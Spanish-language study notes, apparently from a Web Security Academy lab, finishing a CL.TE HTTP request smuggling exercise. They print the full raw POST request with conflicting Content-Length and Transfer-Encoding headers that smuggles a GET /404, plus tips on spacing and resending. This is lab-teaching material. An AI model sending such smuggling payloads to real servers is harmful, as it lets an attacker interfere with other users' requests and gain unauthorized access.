En esta clase finalizamos el laboratorio dedicado a la vulnerabilidad de HTTP request smuggling basada en CL.TE. Tras haber confirmado el comportamiento anómalo del servidor en las clases anteriores, aquí completamos la explotación para lograr el objetivo final del laboratorio.

Utilizamos el mismo punto vulnerable para smugglear una petición maliciosa que se interpretará de forma distinta entre el frontend y el backend, provocando que una solicitud aparentemente inocua desencadene una respuesta inesperada. Este ataque demuestra cómo un atacante podría manipular el flujo de peticiones HTTP para obtener acceso no autorizado o interferir con otros usuarios, cerrando así el ciclo completo de explotación de esta técnica.

Solucion
entonce conociendo el payload vamos a realizar el ataque
(POST / HTTP/1.1

Host: 0a11006e04c3862f83d5509600060068.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 35

Transfer-Encoding: chunked



0



GET /404 HTTP/1.1

X-Ignore: X)

**==Nota: Tenemos que tener cuidado con los espacios==**
una vez aplicado le damos send y incistimos hasta que nos de el error 404
![Pasted_image_20250806195655.png](Imagenes/Pasted_image_20250806195655.png)
